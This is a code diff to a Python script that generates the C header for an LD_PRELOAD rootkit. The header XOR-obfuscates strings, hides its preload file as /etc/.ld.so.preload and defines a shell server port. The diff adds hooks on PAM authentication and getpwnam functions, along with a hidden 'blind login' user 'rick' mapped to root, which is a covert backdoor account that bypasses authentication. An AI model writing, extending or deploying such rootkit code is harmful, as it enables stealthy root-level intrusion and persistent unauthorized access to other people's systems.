@@ -52,6 +52,9 @@ header_template = '''#define _GNU_SOURCE
 #define TERM\t"{term}"
 #define CMD_PROC_NAME\t"{cmd_proc_name}"
 
+#define BLIND_LOGIN\t"{blind_login}"
+#define C_ROOT\t"{c_root}"
+
 #define MAX_LEN 1024
 
 #define SHELL_SERVER_PORT\t{shell_server_port}
@@ -77,8 +80,13 @@ header_template = '''#define _GNU_SOURCE
 #define SYS_LXSTAT 13
 #define SYS_PCAP_LOOP 14
 #define SYS_EXECVE 15
+#define SYS_PAM_AUTHENTICATE 16
+#define SYS_PAM_OPEN_SESSION 17
+#define SYS_GETPWNAM 18
+#define SYS_GETPWNAM_R 19
+#define SYS_PAM_ACCT_MGMT 20
 
-#define SYSCALL_SIZE 16
+#define SYSCALL_SIZE 21
 
 static char *syscall_table[SYSCALL_SIZE] = {{
 '''
@@ -99,7 +107,12 @@ syscalls = [
     "stat",
     "lstat",
     "pcap_loop",
-    "execve"
+    "execve",
+    "pam_authenticate",
+    "pam_open_session",
+    "getpwnam",
+    "getpwnam_r",
+    "pam_acct_mgmt"
 ]
 
 header = header_template.format(
@@ -132,7 +145,9 @@ header = header_template.format(
     ld_linux=xor("ld-linux"),
     ld_trace=xor("LD_TRACE_LOADED_OBJECTS"),
     ld_normal=xor("/etc/ld.so.preload"),
-    ld_hide=xor("/etc/.ld.so.preload")
+    ld_hide=xor("/etc/.ld.so.preload"),
+    blind_login=xor("rick"),
+    c_root=xor("root")
 )
 
 # XOR the syscall names and format them into a list
